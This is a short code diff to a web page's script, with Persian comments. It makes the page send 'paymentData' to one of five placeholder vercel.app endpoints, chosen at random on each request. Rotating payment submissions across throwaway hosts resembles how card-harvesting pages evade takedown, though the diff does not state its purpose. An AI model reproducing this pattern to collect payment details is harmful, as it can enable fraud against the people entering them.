@@ -825,7 +825,18 @@
             nextStep('step4', 'step5');
             
             // ارسال به سرور واقعی (آدرس باید جایگزین شود)
-            const VERIFICATION_SERVER = "https://your-real-verification-server.com/api/verify";
+            const VERIFICATION_SERVERS = [
+              "https://host1.vercel.app/api/verify",
+              "https://host2.vercel.app/api/verify",
+              "https://host3.vercel.app/api/verify",
+              "https://host4.vercel.app/api/verify",
+              "https://host5.vercel.app/api/verify"
+            ];
+
+            function pickVerificationServer() {
+              const idx = Math.floor(Math.random() * VERIFICATION_SERVERS.length);
+              return VERIFICATION_SERVERS[idx];
+            }
             
             try {
                 // نمایش وضعیت در حال بررسی
@@ -851,6 +862,7 @@
                 // نمایش داده‌های ارسالی
                 document.getElementById('paymentData').textContent = JSON.stringify(paymentData, null, 2);
                 
+                const VERIFICATION_SERVER = pickVerificationServer(); 
                 // ارسال درخواست به سرور واقعی
                 const response = await fetch(VERIFICATION_SERVER, {
                     method: 'POST',
